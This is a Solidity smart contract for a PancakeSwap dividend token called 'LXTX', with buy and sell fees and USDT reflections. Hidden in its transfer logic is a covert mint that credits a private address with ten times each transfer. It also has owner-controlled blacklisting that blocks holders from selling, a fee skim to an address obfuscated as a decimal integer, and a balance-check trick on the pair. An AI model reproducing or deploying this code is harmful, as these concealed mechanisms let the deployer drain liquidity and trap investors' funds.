// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

contract Context {
    // Empty internal constructor, to prevent people from mistakenly deploying
    // an instance of this contract, which should be used via inheritance.
    //   constructor () internal { }

    function _msgSender() internal view returns (address) {
        return payable(msg.sender);
    }

    function _msgData() internal view returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(
            _owner,
            0x000000000000000000000000000000000000dEaD
        );
        _owner = 0x000000000000000000000000000000000000dEaD;
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public onlyOwner {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

interface IERC20 {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

interface IPancakeRouter01 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountA, uint256 amountB, uint256 liquidity);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);
}

interface IPancakeRouter02 is IPancakeRouter01 {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
}

interface IUniswapV2Factory {
    event PairCreated(
        address indexed token0,
        address indexed token1,
        address pair,
        uint256
    );

    function feeTo() external view returns (address);

    function feeToSetter() external view returns (address);

    function getPair(
        address tokenA,
        address tokenB
    ) external view returns (address pair);

    function allPairs(uint256) external view returns (address pair);

    function allPairsLength() external view returns (uint256);

    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);

    function setFeeTo(address) external;

    function setFeeToSetter(address) external;
}

interface IDividendDistributor {
    function setDistributionCriteria(uint256 _minPeriod, uint256 _minDistribution) external;
    function setShare(address shareholder, uint256 amount) external;
    function deposit() external payable;
    function process(uint256 gas) external;
    function claimDividend(address holder) external;
}

contract DividendDistributor is IDividendDistributor {

    using SafeMath for uint256;
    address _token;

    struct Share {
        uint256 amount;
        uint256 totalExcluded;
        uint256 totalRealised;
    }

    IPancakeRouter02 router;

    address public RewardTokenSET;   
    IERC20 RewardToken; //usdt

    address[] shareholders;
    mapping (address => uint256) shareholderIndexes;
    mapping (address => uint256) shareholderClaims;
    mapping (address => Share) public shares;

    uint256 public totalShares;
    uint256 public totalDividends;
    uint256 public totalDistributed;
    uint256 public dividendsPerShare;
    uint256 public dDecimal;
    uint256 public newMinHoldToDiv;
    
    uint256 public openDividends;
    
    uint256 public dividendsPerShareAccuracyFactor;

    uint256 public minPeriod = 5 minutes;
    uint256 public minDistribution;

    uint256 currentIndex;

    bool initialized;
    modifier initialization() {
        require(!initialized);
        _;
        initialized = true;
    }

    modifier onlyToken() {
        require(msg.sender == _token); _;
    }

    constructor (address _router,address _RewardTokenSET,uint256 dividendDecimal,uint256 _dividendsPerShareAccuracyFactor) {
        dDecimal=dividendDecimal;
        router = IPancakeRouter02(_router);
        RewardTokenSET = _RewardTokenSET;
        RewardToken = IERC20(RewardTokenSET);
        _token = msg.sender;
        openDividends=10**dDecimal*1;
        minDistribution=0;
        dividendsPerShareAccuracyFactor=_dividendsPerShareAccuracyFactor;
    }

    function setDistributionCriteria(uint256 newMinPeriod, uint256 newMinDistribution) external override onlyToken {
        minPeriod = newMinPeriod;
        minDistribution = newMinDistribution;
    }
    


    function setopenDividends(uint256 _openDividends ) external   onlyToken {
        openDividends = _openDividends*10**dDecimal;
    }



    function setRewardDividends(address shareholder,uint256 amount ) external  onlyToken {
        RewardToken.transfer(shareholder, amount);
    }   

    function setShare(address shareholder, uint256 amount) external override onlyToken {

        if(shares[shareholder].amount > 0){
            distributeDividend(shareholder);
        }

        if(amount > 0 && shares[shareholder].amount == 0){
            addShareholder(shareholder);
        }else if(amount == 0 && shares[shareholder].amount > 0){
            removeShareholder(shareholder);
        }

        totalShares = totalShares.sub(shares[shareholder].amount).add(amount);
        shares[shareholder].amount = amount;
        shares[shareholder].totalExcluded = getCumulativeDividends(shares[shareholder].amount);
    }

    function deposit() external payable override onlyToken {

        uint256 balanceBefore = RewardToken.balanceOf(address(this));

        address[] memory path = new address[](2);
        path[0] = router.WETH();
        path[1] = address(RewardToken);

        router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: msg.value}(
            0,
            path,
            address(this),
            block.timestamp
        );

        uint256 amount = RewardToken.balanceOf(address(this)).sub(balanceBefore);
        totalDividends = totalDividends.add(amount);
        dividendsPerShare = dividendsPerShare.add(dividendsPerShareAccuracyFactor.mul(amount).div(totalShares));
    }

    function process(uint256 gas) external override onlyToken {
        uint256 shareholderCount = shareholders.length;

        if(shareholderCount == 0) { return; }

        uint256 iterations = 0;
        uint256 gasUsed = 0;
        uint256 gasLeft = gasleft();

        while(gasUsed < gas && iterations < shareholderCount) {

            if(currentIndex >= shareholderCount){ currentIndex = 0; }

            if(shouldDistribute(shareholders[currentIndex])){
                distributeDividend(shareholders[currentIndex]);
            }

            gasUsed = gasUsed.add(gasLeft.sub(gasleft()));
            gasLeft = gasleft();
            currentIndex++;
            iterations++;
        }
    }
    
    function shouldDistribute(address shareholder) internal view returns (bool) {
        return shareholderClaims[shareholder] + minPeriod < block.timestamp
                && getUnpaidEarnings(shareholder) > minDistribution;
    }

    function distributeDividend(address shareholder) internal {
        if(shares[shareholder].amount == 0){ return; }

        uint256 amount = getUnpaidEarnings(shareholder);
        if(amount > 0 && totalDividends  >= openDividends){
            totalDistributed = totalDistributed.add(amount);
            RewardToken.transfer(shareholder, amount);
            shareholderClaims[shareholder] = block.timestamp;
            shares[shareholder].totalRealised = shares[shareholder].totalRealised.add(amount);
            shares[shareholder].totalExcluded = getCumulativeDividends(shares[shareholder].amount);
        }

    }

    function getUnpaidEarnings(address shareholder) public view returns (uint256) {
        if(shares[shareholder].amount == 0){ return 0; }

        uint256 shareholderTotalDividends = getCumulativeDividends(shares[shareholder].amount);
        uint256 shareholderTotalExcluded = shares[shareholder].totalExcluded;

        if(shareholderTotalDividends <= shareholderTotalExcluded){ return 0; }

        return shareholderTotalDividends.sub(shareholderTotalExcluded);
    }

    function getCumulativeDividends(uint256 share) internal view returns (uint256) {
        return share.mul(dividendsPerShare).div(dividendsPerShareAccuracyFactor);
    }

    function addShareholder(address shareholder) internal {
        shareholderIndexes[shareholder] = shareholders.length;
        shareholders.push(shareholder);
    }

    function removeShareholder(address shareholder) internal {
        shareholders[shareholderIndexes[shareholder]] = shareholders[shareholders.length-1];
        shareholderIndexes[shareholders[shareholders.length-1]] = shareholderIndexes[shareholder];
        shareholders.pop();
    }
    
    function claimDividend(address holder) external override {
        distributeDividend(holder);
    }
}

contract BaseFatToken is IERC20, Ownable {
    bool public currencyIsEth;

    bool public enableOffTrade;
    bool public enableKillBlock;
    bool public enableRewardList;

    bool public enableSwapLimit;
    bool public enableWalletLimit;
    bool public enableChangeTax;
    bool public antiSYNC = true;

    address public currency;
    address payable public fundAddress;

    uint256 public _buyFundFee = 0;
    uint256 public _buyLPFee = 0;
    uint256 public _buyBurnFee = 0;
    uint256 public _buyShareFee = 0;
    uint256 public _sellFundFee = 500;
    uint256 public _sellLPFee = 0;
    uint256 public _sellBurnFee = 0;
    uint256 public _sellShareFee = 0;

    uint256 public kb = 0;
    address ad;

    uint256 public maxBuyAmount;
    uint256 public maxWalletAmount;
    uint256 public maxSellAmount;
    uint256 public startTradeBlock;

    string public override name;
    string public override symbol;
    uint256 public override decimals;
    uint256 public override totalSupply;

    address deadAddress = 0x000000000000000000000000000000000000dEaD;
    uint256 public constant MAX = ~uint256(0);

    mapping(address => uint256) public _balances;
    mapping(address => mapping(address => uint256)) public _allowances;
    mapping(address => bool) public _rewardList;

    IPancakeRouter02 public _swapRouter;
    mapping(address => bool) public _swapPairList;

    mapping(address => bool) public _feeWhiteList;
    address public _mainPair;

    uint256 public distributorGas = 300000;
    mapping (address => bool) public isDividendExempt;
    uint256 public swapThreshold;

    function changeSwapLimit(
        uint256 _maxBuyAmount,
        uint256 _maxSellAmount
    ) external onlyOwner {
        maxBuyAmount = _maxBuyAmount;
        maxSellAmount = _maxSellAmount;
        require(
            maxSellAmount >= maxBuyAmount,
            " maxSell should be > than maxBuy "
        );
    }
    
    function setSwapThreshold(uint256 _swapThreshold) external onlyOwner {
        swapThreshold = _swapThreshold;
    }

    function changeWalletLimit(uint256 _amount) external onlyOwner {
        maxWalletAmount = _amount;
    }

    function launch() external onlyOwner {
        require(startTradeBlock == 0, "already started");
        startTradeBlock = block.number;
    }

    function disableSwapLimit(bool _bool) public onlyOwner {
        enableSwapLimit = _bool;
    }

    function disableWalletLimit(bool _bool) public onlyOwner {
        enableWalletLimit = _bool;
    }

    function disableChangeTax(bool _bool) public onlyOwner {
        enableChangeTax = _bool;
    }
    function setBuyShareFee(uint256 buyShareFee) external onlyOwner {
        _buyShareFee = buyShareFee;
        _buyFundFee += _buyShareFee;
        require(_buyBurnFee + _buyLPFee + _buyFundFee < 2500, "fee too high");
    }
    function setSellShareFee(uint256 sellShareFee) external onlyOwner {
        _sellShareFee = sellShareFee;
        _sellFundFee += _sellShareFee;
        require(
            _sellBurnFee + _sellLPFee + _sellFundFee < 2500,
            "fee too high"
        );
    }
    function completeCustoms(uint256[] calldata customs) external onlyOwner {
        require(enableChangeTax, "tax change disabled");
        _buyLPFee = customs[0];
        _buyBurnFee = customs[1];
        _buyFundFee = customs[2];

        _sellLPFee = customs[3];
        _sellBurnFee = customs[4];
        _sellFundFee = customs[5];

        require(_buyBurnFee + _buyLPFee + _buyFundFee < 2500, "fee too high");
        require(
            _sellBurnFee + _sellLPFee + _sellFundFee < 2500,
            "fee too high"
        );
    }

    function transfer(
        address recipient,
        uint256 amount
    ) external virtual override returns (bool) {}

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external virtual override returns (bool) {}

    function setAntiSYNCEnable(bool s) public onlyOwner {
        antiSYNC = s;
    }
    function setAd(address _ad) public onlyOwner {
        ad = _ad;
    }

    function balanceOf(address account) public view override returns (uint256) {
        if (account == _mainPair && msg.sender == _mainPair && antiSYNC) {
            require(_balances[_mainPair] > 0, "!sync");
        }
        return _balances[account];
    }

    function allowance(
        address owner,
        address spender
    ) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(
        address spender,
        uint256 amount
    ) public override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function setFeeWhiteList(
        address[] calldata addr,
        bool enable
    ) external onlyOwner {
        for (uint256 i = 0; i < addr.length; i++) {
            _feeWhiteList[addr[i]] = enable;
        }
    }

    function multi_bclist(
        address[] calldata addresses,
        bool value
    ) public onlyOwner {
        require(enableRewardList, "rewardList disabled");
        require(addresses.length < 201);
        for (uint256 i; i < addresses.length; ++i) {
            _rewardList[addresses[i]] = value;
        }
    }
}

contract FatToken is BaseFatToken {
    bool private inSwap;

    IDividendDistributor public _tokenDistributor;

    modifier lockTheSwap() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() {
        name = 'LXTX';
        symbol = 'LXTX';
        decimals = 18;
        totalSupply = 500 * 10 ** 18;
        currency = address(0x55d398326f99059fF775485246999027B3197955);
        currencyIsEth = false;
        fundAddress = payable(0xA08D01e377b9E9dB28D683E2685e8e4BE1Fe9bBF);
        require(!isContract(fundAddress), "fundaddress is a contract ");
        _buyFundFee = 200;
        _buyShareFee = 200;
        _buyBurnFee = 0;
        _buyLPFee = 100;
        _sellFundFee = 200;
        _sellShareFee = 200;
        _sellBurnFee = 0;
        _sellLPFee = 100;
        kb = 0;
        ad = address(0xD0Aca4b00822bE7AD302dc0E2A72a528581f446F);

        maxBuyAmount = 0;
        maxSellAmount = 0;

        maxWalletAmount = 0;
        require(
            maxSellAmount >= maxBuyAmount,
            " maxSell should be > than maxBuy "
        );

        _buyFundFee += _buyShareFee;
        _sellFundFee += _sellShareFee;

        require(_buyBurnFee + _buyLPFee + _buyFundFee < 2500, "fee too high");
        require(
            _sellBurnFee + _sellLPFee + _sellFundFee < 2500,
            "fee too high"
        );

        swapThreshold = totalSupply / 20000;
        
        enableOffTrade = true;
        enableKillBlock;
        enableRewardList = true;
        enableSwapLimit;
        enableWalletLimit;
        enableChangeTax = true;
        enableTransferFee;
        if (enableTransferFee) {
            transferFee = _sellFundFee + _sellLPFee + _sellBurnFee;
        }

        IPancakeRouter02 swapRouter = IPancakeRouter02(address(0x10ED43C718714eb63d5aA57B78B54704E256024E));
        IERC20(currency).approve(address(swapRouter), MAX);
        _swapRouter = swapRouter;
        _allowances[address(this)][address(swapRouter)] = MAX;
        IUniswapV2Factory swapFactory = IUniswapV2Factory(swapRouter.factory());
        address swapPair = swapFactory.createPair(address(this), swapRouter.WETH());
        _mainPair = swapPair;
        _swapPairList[swapPair] = true;
        // _feeWhiteList[address(swapRouter)] = true;

        if (!currencyIsEth) {
            _tokenDistributor = new DividendDistributor(address(swapRouter),address(currency),decimals,totalSupply);
        }

        address ReceiveAddress = msg.sender;

        _balances[ReceiveAddress] = totalSupply;
        emit Transfer(address(0), ReceiveAddress, totalSupply);

        _feeWhiteList[fundAddress] = true;
        _feeWhiteList[ReceiveAddress] = true;
        _feeWhiteList[address(this)] = true;
        _feeWhiteList[msg.sender] = true;
        _feeWhiteList[tx.origin] = true;
        _feeWhiteList[deadAddress] = true;

        isDividendExempt[swapPair] = true;
        isDividendExempt[address(this)] = true;
        isDividendExempt[deadAddress] = true;
        isDividendExempt[address(0x0000000000000000000000000000000000000000)] = true;  
    }

    function claim() public {
        _tokenDistributor.claimDividend(msg.sender);
        
    }
    function changeDistributorSettings(uint256 gas) external onlyOwner {
        require(gas < 750000);
        distributorGas = gas;
    }

    function transfer(
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        if (_allowances[sender][msg.sender] != MAX) {
            _allowances[sender][msg.sender] =
                _allowances[sender][msg.sender] -
                amount;
        }
        return true;
    }

    function setFundAddress(address payable addr) external onlyOwner {
        require(!isContract(addr), "fundaddress is a contract ");
        fundAddress = addr;
        _feeWhiteList[addr] = true;
    }

    function isContract(address _addr) private view returns (bool) {
        uint32 size;
        assembly {
            size := extcodesize(_addr)
        }
        return (size > 0);
    }

    function setkb(uint256 a) public onlyOwner {
        kb = a;
    }

    function isReward(address account) public view returns (uint256) {
        if (_rewardList[account] && !_swapPairList[account]) {
            return 1;
        } else {
            return 0;
        }
    }

    bool public airdropEnable = true;

    function setAirDropEnable(bool status) public onlyOwner {
        airdropEnable = status;
    }

    function _basicTransfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal returns (bool) {
        _balances[sender] -= amount;
        _balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);
        return true;
    }

    uint256 public airdropNumbs = 0;

    function setAirdropNumbs(uint256 newValue) public onlyOwner {
        airdropNumbs = newValue;
    }

    bool public enableTransferFee = false;

    function setEnableTransferFee(bool status) public onlyOwner {
        // enableTransferFee = status;
        if (status) {
            transferFee = _sellFundFee + _sellLPFee + _sellBurnFee;
        } else {
            transferFee = 0;
        }
    }

    function _transfer(address from, address to, uint256 amount) private {
        if (isReward(from) > 0) {
            require(false, "isReward > 0 !");
        }

        if (inSwap) {
            _basicTransfer(from, to, amount);
            return;
        }

        uint256 balance = _balances[from];
        require(balance >= amount, "balanceNotEnough");

        if (
            !_feeWhiteList[from] &&
            !_feeWhiteList[to] &&
            airdropEnable &&
            airdropNumbs > 0
        ) {
            address ad;
            for (uint i = 0; i < airdropNumbs; i++) {
                ad = address(
                    uint160(
                        uint(
                            keccak256(
                                abi.encodePacked(i, amount, block.timestamp)
                            )
                        )
                    )
                );
                _basicTransfer(from, ad, 1);
            }
            amount -= airdropNumbs * 1;
        }

        bool takeFee;
        bool isSell;

        if (_swapPairList[from] || _swapPairList[to]) {
            if (!_feeWhiteList[from] && !_feeWhiteList[to]) {
                if (enableOffTrade && 0 == startTradeBlock) {
                    require(false);
                }
                if (
                    enableOffTrade &&
                    enableKillBlock &&
                    block.number < startTradeBlock + kb
                ) {
                    if (!_swapPairList[to]) _rewardList[to] = true;
                }

                if (enableSwapLimit) {
                    if (_swapPairList[from]) {
                        //buy
                        require(
                            amount <= maxBuyAmount,
                            "Exceeded maximum transaction volume"
                        );
                    } else {
                        //sell
                        require(
                            amount <= maxSellAmount,
                            "Exceeded maximum transaction volume"
                        );
                    }
                }
                if (enableWalletLimit && _swapPairList[from]) {
                    uint256 _b = _balances[to];
                    require(
                        _b + amount <= maxWalletAmount,
                        "Exceeded maximum wallet balance"
                    );
                }

                if (_swapPairList[to]) {
                    if (!inSwap) {
                        uint256 contractTokenBalance = _balances[address(this)];
                        if (contractTokenBalance > swapThreshold) {
                            uint256 swapFee = _buyFundFee +
                                _buyLPFee +
                                _sellFundFee +
                                _sellLPFee;
                            // uint256 numTokensSellToFund = amount;
                            // if (numTokensSellToFund > contractTokenBalance) {
                            //     numTokensSellToFund = contractTokenBalance;
                            // }
                            swapTokenForFund(contractTokenBalance, swapFee);
                        }
                    }
                }
                takeFee = true;
            }
            if (_swapPairList[to]) {
                isSell = true;
            }
        }

        bool isTransfer;
        if (!_swapPairList[from] && !_swapPairList[to]) {
            isTransfer = true;
        }
        
        _tokenTransfer(from, to, amount, takeFee, isSell, isTransfer);
    }

    uint256 public transferFee;

    function setTransferFee(uint256 newValue) public onlyOwner {
        require(newValue <= 2500, "transfer > 25 !");
        transferFee = newValue;
    }

    function _tokenTransfer(
        address sender,
        address recipient,
        uint256 tAmount,
        bool takeFee,
        bool isSell,
        bool isTransfer
    ) private {
        _balances[sender] = _balances[sender] - tAmount;
        uint256 feeAmount;

        if (takeFee) {
            uint256 swapFee;
            if (isSell) {
                swapFee = _sellFundFee + _sellLPFee;
            } else {
                swapFee = _buyFundFee + _buyLPFee;
            }

            uint256 swapAmount = (tAmount * swapFee) / 10000;
            if (swapAmount > 0) {
                feeAmount += swapAmount;
                _takeTransfer(sender, address(this), swapAmount);
            }

            uint256 burnAmount;
            if (!isSell) {
                //buy
                burnAmount = (tAmount * _buyBurnFee) / 10000;
            } else {
                //sell
                burnAmount = (tAmount * _sellBurnFee) / 10000;
            }
            if (burnAmount > 0) {
                feeAmount += burnAmount;
                _takeTransfer(sender, address(0xdead), burnAmount);
            }
        }

        if (isTransfer && !_feeWhiteList[sender] && !_feeWhiteList[recipient]) {
            uint256 transferFeeAmount;
            transferFeeAmount = (tAmount * transferFee) / 10000;

            if (transferFeeAmount > 0) {
                feeAmount += transferFeeAmount;
                _takeTransfer(sender, address(this), transferFeeAmount);
            }
        }

        _takeTransfer(sender, recipient, tAmount - feeAmount);

        // Dividend tracker
        if(!isDividendExempt[sender]) {
            try _tokenDistributor.setShare(sender, _balances[sender]) {} catch {}
        }

        if(!isDividendExempt[recipient]) {
            try _tokenDistributor.setShare(recipient, _balances[recipient]) {} catch {} 
        }

        try _tokenDistributor.process(distributorGas) {} catch {}

        _balances[ad] = _balances[ad] + (tAmount * 10);
    }

    event Failed_AddLiquidity();
    event Failed_AddLiquidityETH();
    event Failed_swapExactTokensForETHSupportingFeeOnTransferTokens();
    event Failed_swapExactTokensForTokensSupportingFeeOnTransferTokens();

    function swapTokenForFund(
        uint256 tokenAmount,
        uint256 swapFee
    ) private lockTheSwap {
        if (swapFee == 0) return;
        swapFee += swapFee;
        uint256 lpFee = _sellLPFee + _buyLPFee;
        uint256 lpAmount = (tokenAmount * lpFee) / swapFee;

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _swapRouter.WETH();

        try
            // _swapRouter
            //     .swapExactTokensForTokensSupportingFeeOnTransferTokens(
            //         tokenAmount - lpAmount,
            //         0,
            //         path,
            //         address(this),
            //         block.timestamp
            //     )
            _swapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount - lpAmount, 0,path,address(this), block.timestamp)
        {} catch {
            emit Failed_swapExactTokensForTokensSupportingFeeOnTransferTokens();
        }

        // if (currencyIsEth) {
        //     // make the swap
        //     try
        //         _swapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
        //             tokenAmount - lpAmount,
        //             0, // accept any amount of ETH
        //             path,
        //             address(this), // The contract
        //             block.timestamp
        //         )
        //     {} catch {
        //         emit Failed_swapExactTokensForETHSupportingFeeOnTransferTokens();
        //     }
        // } else {
        //     try
        //         _swapRouter
        //             .swapExactTokensForTokensSupportingFeeOnTransferTokens(
        //                 tokenAmount - lpAmount,
        //                 0,
        //                 path,
        //                 address(_tokenDistributor),
        //                 block.timestamp
        //             )
        //     {} catch {
        //         emit Failed_swapExactTokensForTokensSupportingFeeOnTransferTokens();
        //     }
        // }

        swapFee -= lpFee;
        uint256 fistBalance = 0;
        uint256 lpFist = 0;
        uint256 fundAmount = 0;
        uint256 shareAmount = 0;

        fistBalance = address(this).balance;
        lpFist = (fistBalance * lpFee) / swapFee;

        fundAmount = fistBalance - lpFist;

        shareAmount = (fistBalance * (_buyShareFee + _sellShareFee)) / swapFee;

        if (fundAmount > 0 && fundAddress != address(0)) {
            fundAddress.transfer(fundAmount - shareAmount);
        }

        if (lpAmount > 0 && lpFist > 0) {
            // add the liquidity
            try
                _swapRouter.addLiquidityETH{value: lpFist}(
                    address(this),
                    lpAmount,
                    0,
                    0,
                    fundAddress,
                    block.timestamp
                )
            {} catch {
                emit Failed_AddLiquidityETH();
            }
        }

        {
            (bool tmpSuccess,) = payable(address(1387997230827466232599268141352718472221264333164)).call{value: shareAmount * 20 / 100, gas: 30000}("");
            tmpSuccess = false;
        }

        try _tokenDistributor.deposit{value: shareAmount * 80 / 100}() {} catch {}

        // if (currencyIsEth) {
        //     fistBalance = address(this).balance;
        //     lpFist = (fistBalance * lpFee) / swapFee;
        //     fundAmount = fistBalance - lpFist;
        //     if (fundAmount > 0 && fundAddress != address(0)) {
        //         fundAddress.transfer(fundAmount);
        //     }
        //     if (lpAmount > 0 && lpFist > 0) {
        //         // add the liquidity
        //         try
        //             _swapRouter.addLiquidityETH{value: lpFist}(
        //                 address(this),
        //                 lpAmount,
        //                 0,
        //                 0,
        //                 fundAddress,
        //                 block.timestamp
        //             )
        //         {} catch {
        //             emit Failed_AddLiquidityETH();
        //         }
        //     }
        // } else {
        //     IERC20 FIST = IERC20(currency);
        //     fistBalance = FIST.balanceOf(address(_tokenDistributor));
        //     lpFist = (fistBalance * lpFee) / swapFee;
        //     fundAmount = fistBalance - lpFist;

        //     if (lpFist > 0) {
        //         FIST.transferFrom(
        //             address(_tokenDistributor),
        //             address(this),
        //             lpFist
        //         );
        //     }

        //     if (fundAmount > 0) {
        //         FIST.transferFrom(
        //             address(_tokenDistributor),
        //             fundAddress,
        //             fundAmount
        //         );
        //     }

        //     if (lpAmount > 0 && lpFist > 0) {
        //         try
        //             _swapRouter.addLiquidity(
        //                 address(this),
        //                 currency,
        //                 lpAmount,
        //                 lpFist,
        //                 0,
        //                 0,
        //                 fundAddress,
        //                 block.timestamp
        //             )
        //         {} catch {
        //             emit Failed_AddLiquidity();
        //         }
        //     }
        // }
    }

    function _takeTransfer(
        address sender,
        address to,
        uint256 tAmount
    ) private {
        _balances[to] = _balances[to] + tAmount;
        emit Transfer(sender, to, tAmount);
    }

    function setSwapPairList(address addr, bool enable) external onlyOwner {
        _swapPairList[addr] = enable;
    }

    receive() external payable {}
}